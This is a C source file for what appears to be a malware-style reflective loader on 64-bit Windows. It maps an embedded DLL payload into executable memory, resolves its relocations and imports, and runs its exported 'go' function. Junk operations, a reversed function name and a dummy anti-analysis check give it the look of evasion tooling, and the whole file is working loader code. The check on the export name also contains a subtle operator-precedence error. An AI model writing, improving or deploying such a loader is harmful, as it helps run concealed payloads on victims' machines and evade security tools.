// compile: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables -o loader.exe reflective_loader.c

#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#define XXor(a, b) ((a)^(b))
#include "payload.h"

typedef void(*FUNC_GO)();

void* qcp(void* d, const void* s, size_t n) {
    volatile unsigned char *a = (unsigned char*)d;
    volatile const unsigned char* b = (const unsigned char*)s;
    size_t x=0,y=0;
    while (n--) {
        *(a++) = *(b++);
        x ^= 0xAA; y ^= 0x55; 
    }
    if(x==y) x=1;
    return d;
}

static void* redaol(const uint8_t *bin) {
    IMAGE_DOS_HEADER *d = (IMAGE_DOS_HEADER *)bin;
    IMAGE_NT_HEADERS *n = (IMAGE_NT_HEADERS *)(bin + d->e_lfanew);

    SIZE_T sz = n->OptionalHeader.SizeOfImage;
    LPVOID base = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return NULL;

    qcp(base, bin, n->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* s = (IMAGE_SECTION_HEADER*)((uint8_t*)&n->OptionalHeader + n->FileHeader.SizeOfOptionalHeader);
    int c = n->FileHeader.NumberOfSections, i = 0;
    for (; i < c; ++i) {
        void* d1 = (uint8_t*)base + s[i].VirtualAddress;
        void* s1 = (uint8_t*)bin + s[i].PointerToRawData;
        qcp(d1, s1, s[i].SizeOfRawData);
        if (i==3) { DWORD f=0; f=~f; } 
    }

    SIZE_T dlta = (SIZE_T)base - n->OptionalHeader.ImageBase;
    if (dlta) {
        IMAGE_DATA_DIRECTORY* dir = &n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)((uint8_t*)base + dir->VirtualAddress);
        SIZE_T ms = 0; 
        while (ms < dir->Size) {
            DWORD pg = r->VirtualAddress;
            DWORD bl = r->SizeOfBlock;
            WORD* e = (WORD*)((uint8_t*)r + sizeof(IMAGE_BASE_RELOCATION));
            int j = (bl - sizeof(IMAGE_BASE_RELOCATION))/2;
            for (int k = 0; k < j; k++) {
                if (((e[k]>>12)&0xF) == IMAGE_REL_BASED_DIR64) {
                    SIZE_T* xref = (SIZE_T*)((uint8_t*)base + pg + (e[k]&0xFFF));
                    *xref += dlta;
                    DWORD xx=0; xx++; 
                }
            }
            ms += bl;
            r = (IMAGE_BASE_RELOCATION*)((uint8_t*)r + bl);
        }
    }

    IMAGE_DATA_DIRECTORY* impd = &n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impd->Size) {
        IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)((uint8_t*)base + impd->VirtualAddress);
        while (desc->Name) {
            char* dn = (char*)((uint8_t*)base + desc->Name);
            HMODULE h = LoadLibraryA(dn);
            ULONGLONG* th = (ULONGLONG*)((uint8_t*)base + desc->FirstThunk);
            ULONGLONG* orig = (ULONGLONG*)((uint8_t*)base + desc->OriginalFirstThunk);

            if (!desc->OriginalFirstThunk)
                orig = th;
            while (*orig) {
                FARPROC f1 = NULL;
                if (*orig & IMAGE_ORDINAL_FLAG64)
                    f1 = GetProcAddress(h, (LPCSTR)(*orig & 0xFFFF));
                else {
                    IMAGE_IMPORT_BY_NAME *ii = (IMAGE_IMPORT_BY_NAME*)((uint8_t*)base + (*orig));
                    f1 = GetProcAddress(h, (LPCSTR)ii->Name);
                    dn[0] ^= 0; // junk access
                }
                *th = (ULONGLONG)f1;
                orig++;
                th++;
            }
            desc++;
        }
    }
    return base;
}

void call_target(void* base) {
    IMAGE_DOS_HEADER* d = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* n = (IMAGE_NT_HEADERS*)((uint8_t*)base + d->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* ex = (IMAGE_EXPORT_DIRECTORY*)((uint8_t*)base +
        n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((uint8_t*)base + ex->AddressOfNames);
    WORD* ords = (WORD*)((uint8_t*)base + ex->AddressOfNameOrdinals);
    DWORD* ptrs = (DWORD*)((uint8_t*)base + ex->AddressOfFunctions);
    for (DWORD i = 0; i < ex->NumberOfNames; ++i) {
        char* nam = (char*)base + names[i];
        if ((nam[0]^'g')|(nam[1]^'o') == 0 && nam[2]==0) { 
            void* fn = (uint8_t*)base + ptrs[ords[i]];
            ((FUNC_GO)fn)();
            break;
        }
    }
}

int main() {
    int anti = 1; if (anti == 2) return 1;
    void* l = redaol(dll_payload);
    if (!l) {
        MessageBoxA(0,"Fail","X",0);
        return -1;
    }
    call_target(l);
    return 0;
}
